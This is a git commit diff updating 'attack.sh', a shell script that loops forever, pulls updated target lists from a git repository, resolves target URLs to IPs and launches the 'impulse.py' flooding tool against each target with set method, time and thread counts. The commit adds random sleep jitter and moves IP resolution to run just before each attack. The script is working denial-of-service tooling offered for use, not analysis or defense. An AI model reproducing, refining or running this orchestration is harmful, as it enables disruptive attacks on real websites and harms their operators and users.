cde8f046fc1e4f5e414a09c75f1694118fc65b9a
qr31415 <100649607+qr31415@users.noreply.github.com>
2022-03-01 14:18:16 +0100

    Update attack.sh
    * add jitter to avoid concurrency updates from Git
    * remove prefetched IPs files, because it doesn't work for concurrent execution (fetching takes some time, and if we start two threads they will block each other)
    * convert URL to IP just before executing impulse.py.

--- attack.sh
+++ attack.sh
@@ -8,7 +8,7 @@ while [ $# -gt 0 ]; do
 done
 
 # Set default values for arguments if missing.
-method="${method:-HTTP}" 
+method="${method:-HTTP}"
 time="${time:-50}"
 threads="${threads:-20}"
 ip_refresh_period_sec=1800; # 30 minutes
@@ -17,25 +17,18 @@ attack="python3 impulse.py --method ${method} --time ${time} --threads ${threads
 
 while true
 do
+  # jitter to avoid concurency updates from Git
+  sleep $[ ( $RANDOM % 10 )  + 1 ]s
+  
   echo "Get the latest scripts & URLs..."
-  git pull --rebase
-  echo "Check if need to convert URLs to IPs..."
-  now=$(date +%s)
-  last_updated_at=0
-  if [ -f ips ]; then
-    last_updated_at=$(date -r ips +%s)
-  fi 
-  diff=`expr ${now} - ${last_updated_at}` 
-  if [ "$diff" -gt "$ip_refresh_period_sec" ]; then
-    echo "Resolving IPs..."
-    cat urls | xargs -n1 -I % bash -c 'node ip-lookup.mjs %' > ips
-  fi
+  git pull --rebase origin master
+  
   echo "Done!"
   echo "Start attacking..."
   if [ "$method" == "HTTP" ]; then
     cat urls | xargs -n1 -I % bash -c "${attack}"
   else
-    cat ips | xargs -n1 -I % bash -c "${attack}"
+    cat urls | xargs -n1 -I % bash -c 'node ip-lookup.mjs %' | xargs -n1 -I % bash -c "${attack}"
   fi
 
   sleep 1
